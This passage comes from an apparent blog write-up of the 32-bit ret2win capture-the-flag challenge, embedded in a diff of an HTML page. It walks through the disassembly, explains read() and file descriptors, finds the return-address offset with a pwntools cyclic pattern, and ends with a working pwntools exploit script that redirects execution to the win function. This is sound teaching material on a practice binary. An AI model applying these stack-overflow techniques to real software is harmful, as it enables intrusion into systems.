+<span style="color:#ae81ff">0x080486c4</span>  _fini
+</code></pre></div><p>So lets disassemble pwnme</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">pwndbg<span style="color:#f92672">&gt;</span> disass pwnme 
+Dump of assembler code <span style="color:#66d9ef">for</span> function pwnme:
+   <span style="color:#ae81ff">0x080485ad</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;:</span> push   ebp
+   <span style="color:#ae81ff">0x080485ae</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;:</span> mov    ebp,esp
+   <span style="color:#ae81ff">0x080485b0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">3</span><span style="color:#f92672">&gt;:</span> sub    esp,<span style="color:#ae81ff">0x28</span>
+   <span style="color:#ae81ff">0x080485b3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">6</span><span style="color:#f92672">&gt;:</span> sub    esp,<span style="color:#ae81ff">0x4</span>
+   <span style="color:#ae81ff">0x080485b6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;:</span> push   <span style="color:#ae81ff">0x20</span>
+   <span style="color:#ae81ff">0x080485b8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;:</span>    push   <span style="color:#ae81ff">0x0</span>
+   <span style="color:#ae81ff">0x080485ba</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">13</span><span style="color:#f92672">&gt;:</span>    lea    eax,[ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x28</span>]
+   <span style="color:#ae81ff">0x080485bd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">&gt;:</span>    push   eax
+   <span style="color:#ae81ff">0x080485be</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">17</span><span style="color:#f92672">&gt;:</span>    call   <span style="color:#ae81ff">0x8048410</span> <span style="color:#f92672">&lt;</span>memset<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x080485c3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">22</span><span style="color:#f92672">&gt;:</span>    add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x080485c6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">&gt;:</span>    sub    esp,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#ae81ff">0x080485c9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;:</span>    push   <span style="color:#ae81ff">0x8048708</span>
+   <span style="color:#ae81ff">0x080485ce</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;:</span>    call   <span style="color:#ae81ff">0x80483d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x080485d3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">38</span><span style="color:#f92672">&gt;:</span>    add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x080485d6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">41</span><span style="color:#f92672">&gt;:</span>    sub    esp,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#ae81ff">0x080485d9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">44</span><span style="color:#f92672">&gt;:</span>    push   <span style="color:#ae81ff">0x8048768</span>
+   <span style="color:#ae81ff">0x080485de</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">49</span><span style="color:#f92672">&gt;:</span>    call   <span style="color:#ae81ff">0x80483d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x080485e3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">54</span><span style="color:#f92672">&gt;:</span>    add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x080485e6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">57</span><span style="color:#f92672">&gt;:</span>    sub    esp,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#ae81ff">0x080485e9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">60</span><span style="color:#f92672">&gt;:</span>    push   <span style="color:#ae81ff">0x8048788</span>
+   <span style="color:#ae81ff">0x080485ee</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">65</span><span style="color:#f92672">&gt;:</span>    call   <span style="color:#ae81ff">0x80483d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x080485f3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">70</span><span style="color:#f92672">&gt;:</span>    add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x080485f6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">73</span><span style="color:#f92672">&gt;:</span>    sub    esp,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#ae81ff">0x080485f9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">76</span><span style="color:#f92672">&gt;:</span>    push   <span style="color:#ae81ff">0x80487e8</span>
+   <span style="color:#ae81ff">0x080485fe</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">81</span><span style="color:#f92672">&gt;:</span>    call   <span style="color:#ae81ff">0x80483c0</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x08048603</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">86</span><span style="color:#f92672">&gt;:</span>    add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x08048606</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">89</span><span style="color:#f92672">&gt;:</span>    sub    esp,<span style="color:#ae81ff">0x4</span>
+   <span style="color:#ae81ff">0x08048609</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">92</span><span style="color:#f92672">&gt;:</span>    push   <span style="color:#ae81ff">0x38</span>   <span style="color:#f92672">&lt;----------------</span><span style="color:#960050;background-color:#1e0010">#</span>size_t nbyte
+   <span style="color:#ae81ff">0x0804860b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">94</span><span style="color:#f92672">&gt;:</span>    lea    eax,[ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x28</span>]
+   <span style="color:#ae81ff">0x0804860e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">97</span><span style="color:#f92672">&gt;:</span>    push   eax    <span style="color:#f92672">&lt;----------------</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#66d9ef">void</span> buf
+   <span style="color:#ae81ff">0x0804860f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">98</span><span style="color:#f92672">&gt;:</span>    push   <span style="color:#ae81ff">0x0</span>    <span style="color:#f92672">&lt;----------------</span><span style="color:#960050;background-color:#1e0010">#</span>fd
+   <span style="color:#ae81ff">0x08048611</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">100</span><span style="color:#f92672">&gt;:</span>   call   <span style="color:#ae81ff">0x80483b0</span> <span style="color:#f92672">&lt;</span>read<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x08048616</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">105</span><span style="color:#f92672">&gt;:</span>   add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x08048619</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">108</span><span style="color:#f92672">&gt;:</span>   sub    esp,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#ae81ff">0x0804861c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">111</span><span style="color:#f92672">&gt;:</span>   push   <span style="color:#ae81ff">0x80487eb</span>
+   <span style="color:#ae81ff">0x08048621</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">116</span><span style="color:#f92672">&gt;:</span>   call   <span style="color:#ae81ff">0x80483d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x08048626</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">121</span><span style="color:#f92672">&gt;:</span>   add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x08048629</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">124</span><span style="color:#f92672">&gt;:</span>   nop
+   <span style="color:#ae81ff">0x0804862a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">125</span><span style="color:#f92672">&gt;:</span>   leave  
+   <span style="color:#ae81ff">0x0804862b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">126</span><span style="color:#f92672">&gt;:</span>   ret  
+</code></pre></div><p>Alot of stuff happens here, and it&rsquo;ll be somewhat hard for any beginner to know exactly what&rsquo;s happening here. But we can see that at &lt;+100&gt;, read@plt is called. If we look at the linux manpage for this systemcall we&rsquo;ll learn that: &ldquo;read() attempts to read up to count bytes from file descriptor fd into the buffer starting at buf.&rdquo; Well.. What does that mean? First we need to understand that syscalls takes arguments.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">ssize_t <span style="color:#a6e22e">read</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, size_t count);
+</code></pre></div><p>It takes a filedescriptor, a buf, annd a size_t.</p>
+<p>What&rsquo;s a file descriptor? Well according to @Beano on stackoverflow it can be classified as:
+&ldquo;An opaque handle that is used in the interface between user and kernel space to identify file/socket resources. Therefore, when you use open() or socket() (system calls to interface to the kernel), you are given a file descriptor, which is an integer (it is actually an index into the processes u structure - but that is not important). Therefore, if you want to interface directly with the kernel, using system calls to read(), write(), close() etc. the handle you use is a file descriptor.&rdquo;</p>
+<p>TLDR; It&rsquo;s a handle used between user and the kernel.</p>
+<p>Important file descriptor values are:</p>
+<pre tabindex="0"><code>Value---Name---Filestream    
+
+0---Standard input---stdin
+
+1---Standard output---stdout
+
+2---Standard error---stderr
+</code></pre><p>If you look above at the disassembling of pwnme, you can see that right before the read@plt call, 0x0 is pushed onto the stack. Which is standard input. This is when the user is prompted for input. Interesting, right?</p>
+<p>Let&rsquo;s pick up the pace a little bit. Otherwise I&rsquo;m going to be here all night.</p>
+<p>If we run the program and put in a shit ton of A&rsquo;s, we&rsquo;ll get the bread and butter of stack overflows. Segmentation fault! This tells the exploiter, that somehow he might&rsquo;ve overwritten an address in the program, causing an error.</p>
+<pre tabindex="0"><code>Segmentation fault (core dumped)
+</code></pre><p>In gdb(pwndbg) you can run a program and make it stop at certain addresses. This is done by break *addr. You can then step one instruction at a time with si or use ni, which just checks the function you&rsquo;re in. More on that later. Lets open the program with gdb and set a breakpoint right before the read(), this is in my program at pwn+98, it might be different for you. We then run and use ni twice. Now we&rsquo;re prompted for an input. Let&rsquo;s just put in a shit ton of A&rsquo;s.</p>
+<p>(A shit ton is more than 100, just like hold it A down while you glance out the windows, idfk)
+I get a &ldquo;Undefined command&rdquo;.. hmm weird.. But if I look at the registers and stack I see this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">Stack
+<span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0000</span><span style="color:#960050;background-color:#1e0010">│</span> esp  <span style="color:#ae81ff">0xffffd100</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x0</span>
+<span style="color:#ae81ff">01</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0004</span><span style="color:#960050;background-color:#1e0010">│</span>      <span style="color:#ae81ff">0xffffd104</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0xffffd110</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style="color:#960050;background-color:#1e0010">&#39;</span>
+<span style="color:#ae81ff">02</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>      <span style="color:#ae81ff">0xffffd108</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x38</span> <span style="color:#75715e">/* &#39;8&#39; */</span>
+<span style="color:#ae81ff">03</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000</span>c<span style="color:#960050;background-color:#1e0010">│</span>      <span style="color:#ae81ff">0xffffd10c</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x4</span>
+<span style="color:#ae81ff">04</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0010</span><span style="color:#960050;background-color:#1e0010">│</span> ecx  <span style="color:#ae81ff">0xffffd110</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</code></pre></div><p>And registers:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#f92672">*</span>EAX  <span style="color:#ae81ff">0x38</span>
+ EBX  <span style="color:#ae81ff">0x0</span>
+<span style="color:#f92672">*</span>ECX  <span style="color:#ae81ff">0xffffd110</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style="color:#960050;background-color:#1e0010">&#39;</span>
+<span style="color:#f92672">*</span>EDX  <span style="color:#ae81ff">0x38</span>
+ EDI  <span style="color:#ae81ff">0xf7fb2000</span> (_GLOBAL_OFFSET_TABLE_) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x1ead6c</span>
+ ESI  <span style="color:#ae81ff">0xf7fb2000</span> (_GLOBAL_OFFSET_TABLE_) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x1ead6c</span>
+ EBP  <span style="color:#ae81ff">0xffffd138</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>AAAAAAAAAAAAAAAA<span style="color:#960050;background-color:#1e0010">&#39;</span>
+ ESP  <span style="color:#ae81ff">0xffffd100</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x0</span>
+<span style="color:#f92672">*</span>EIP  <span style="color:#ae81ff">0x8048616</span> (pwnme<span style="color:#f92672">+</span><span style="color:#ae81ff">105</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> add    esp, <span style="color:#ae81ff">0x10</span>
+</code></pre></div><p>We have control of the ecx register and ebp register as we can see we overflowed those with A&rsquo;s.
+In gdb we can use the command to look at the stack:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff"><span style="color:#f92672">-pwndbg&gt; x/100x $sp
+</span><span style="color:#f92672"></span>0xffffd100: 0x00000000  0xffffd110  0x00000038  0x00000004
+0xffffd110: 0x41414141  0x41414141  0x41414141  0x41414141
+0xffffd120: 0x41414141  0x41414141  0x41414141  0x41414141
+0xffffd130: 0x41414141  0x41414141  0x41414141  0x41414141
+0xffffd140: 0x41414141  0x41414141  0x00000000  0xf7de5ee5
+0xffffd150: 0xf7fb2000  0xf7fb2000  0x00000000  0xf7de5ee5
+0xffffd160: 0x00000001  0xffffd1f4  0xffffd1fc  0xffffd184
+0xffffd170: 0xf7fb2000  0x00000000
+</code></pre></div><p>The hex character for capital a (A) is 41. We can see the stack is filled with A&rsquo;s</p>
+<p>If we run again, we&rsquo;ll get an interesting error: &ldquo;Invalid address at 0x41414141&rdquo; error. Huh?? Seems like it tries to go to an address called 0x41414141??
+Cool if we just controlled the address the program tries to go to, we can make it go to &ldquo;ret2win&rdquo; and we would&rsquo;ve pwned the program. Now we&rsquo;ll be using a pattern generator from pwntools, to find out where this return address is at.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">Python <span style="color:#ae81ff">3.8.5</span> (default, Jul <span style="color:#ae81ff">28</span> <span style="color:#ae81ff">2020</span>, <span style="color:#ae81ff">12</span>:<span style="color:#ae81ff">59</span>:<span style="color:#ae81ff">40</span>) 
+[GCC <span style="color:#ae81ff">9.3.0</span>] on linux
+Type <span style="color:#e6db74">&#34;help&#34;</span>, <span style="color:#e6db74">&#34;copyright&#34;</span>, <span style="color:#e6db74">&#34;credits&#34;</span> <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;license&#34;</span> <span style="color:#66d9ef">for</span> more information<span style="color:#f92672">.</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> pattern <span style="color:#f92672">=</span> cyclic_gen()
+<span style="color:#f92672">&gt;&gt;&gt;</span> pattern<span style="color:#f92672">.</span>get(<span style="color:#ae81ff">100</span>)
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#39;</span>
+</code></pre></div><p>If we copy the pattern, we&rsquo;ll be able to see where exactly the return addr is at.
+We follow the same process from before, and ni each step through starting from pwn+98. At return we&rsquo;ll see:
+&lt;0x6161616c&gt;
+The 616161 is a, and the 6c is an l.</p>
+<p>Great so that means we add
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa, characters and can put in our address to return to. A few things to note about the address is, that:</p>
+<ol>
+<li>The address will need to be passed in little-endian formatting</li>
+<li>The address can be any address you see in gdb, that is in the .text segment, as these addresses are static</li>
+</ol>
+<p>The smart thing about Return-Oriented-Programming, is exactly that one doesn&rsquo;t have to worry about security measures
+such as ASLR, because you return to already written code that has a static address.</p>
+<p><strong>Conclusion: You should now have a lot of knowledge important for the further challenges. We used a &ldquo;shit ton&rdquo; of useless characters to overwrite the stack till our return address, at our return address we put an adress we want to return to. We convert the address, since the program is using little endian.</strong></p>
+<p>Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+elfPath<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;./ret2win32&#34;</span> <span style="color:#75715e">#Path to binary</span>
+context<span style="color:#f92672">.</span>arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;i386&#34;</span>
+
+gdbscript<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">continue
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+
+terminalSetting <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;gnome-terminal&#39;</span>, <span style="color:#e6db74">&#39;-e&#39;</span>] <span style="color:#75715e">#Ubuntu terminal=gnome-terminal</span>
+context<span style="color:#f92672">.</span>clear(terminal<span style="color:#f92672">=</span>terminalSetting)
+
+io <span style="color:#f92672">=</span> pwnlib<span style="color:#f92672">.</span>gdb<span style="color:#f92672">.</span>debug(elfPath, gdbscript <span style="color:#f92672">=</span> gdbscript)
+
+point<span style="color:#f92672">=</span>cyclic_find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;laaa&#34;</span>, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;little&#34;</span>)
+
+ret2win<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x804862c</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    print(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;&gt; &#34;</span>))
+    print(io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>point<span style="color:#f92672">+</span>ret2win)) <span style="color:#75715e">#Sends 44 A&#39;s, and then the address to the ret2win function</span>
+    io<span style="color:#f92672">.</span>interactive() <span style="color:#75715e">#Interactive state</span>
+
+main()
+</code></pre></div>
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+        
+
+        <div class="site-footer">
+  
+  
+</div>
+
+      </div>
+    </div>
+  </article>
+
+  
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
